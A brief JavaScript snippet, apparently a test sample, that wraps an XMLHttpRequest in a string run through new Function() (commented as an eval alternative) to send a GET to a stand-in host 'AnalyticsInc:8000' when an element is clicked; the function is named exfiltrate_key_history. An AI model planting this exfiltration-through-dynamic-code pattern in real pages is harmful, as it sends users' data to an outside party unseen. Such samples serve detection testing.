function exfiltrate_key_history() {

    // New Function - Eval Alternative - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=func", true);xmlhttp.send(null);';
	var tmpFunc=new Function(exp);
	tmpFunc();
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
